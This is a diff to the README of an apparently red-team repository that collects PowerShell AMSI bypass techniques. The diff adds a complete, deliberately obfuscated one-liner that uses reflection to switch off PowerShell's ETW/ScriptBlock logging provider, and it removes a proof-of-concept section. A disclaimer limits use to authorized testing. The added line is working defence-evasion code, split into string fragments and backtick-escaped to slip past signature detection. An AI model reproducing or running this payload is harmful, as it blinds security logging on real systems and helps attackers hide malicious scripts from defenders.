@@ -1,5 +1,7 @@
 <div align="center">
 
+![AMSI Bypass Demo](assets/demo.gif)
+
 # 🛡️ RedTeam PowerShell AMSI Bypass
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-red.svg)](LICENSE)
@@ -10,8 +12,6 @@
 **A comprehensive collection of AMSI (Antimalware Scan Interface) bypass techniques for security research, penetration testing, and red team operations.**
 
 > ⚠️ **For authorized security testing and educational purposes only.** Unauthorized use against systems you don't own or have permission to test is illegal.
-
-</div>
 
 ---
 
@@ -27,7 +27,6 @@
   - [Multi-Liner Bypasses](#3-multi-liner-bypasses)
   - [Advanced Bypasses](#4-advanced-bypasses)
   - [ScriptBlock Logging Bypass](#5-scriptblock-logging-bypass)
-- [Proof of Concept](#-proof-of-concept)
 - [Detection & Prevention](#-detection--prevention)
 - [Disclaimer](#-disclaimer)
 
@@ -258,20 +257,8 @@ Located in `Utils/`, these scripts disable **PowerShell ScriptBlock Logging** to
 
 **One-liner ETW kill (`ScriptBlock-Logging-Bypass-OneLiner.txt`):**
 ```powershell
-# Paste the content of ScriptBlock-Logging-Bypass-OneLiner.txt directly
+[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
 ```
-
----
-
-## 🎬 Proof of Concept
-
-<div align="center">
-
-![AMSI Bypass Demo](assets/demo.gif)
-
-*Demonstrating: Status Check → AMSI Bypass → ScriptBlock Logging Bypass → Verification*
-
-</div>
 
 ---
 
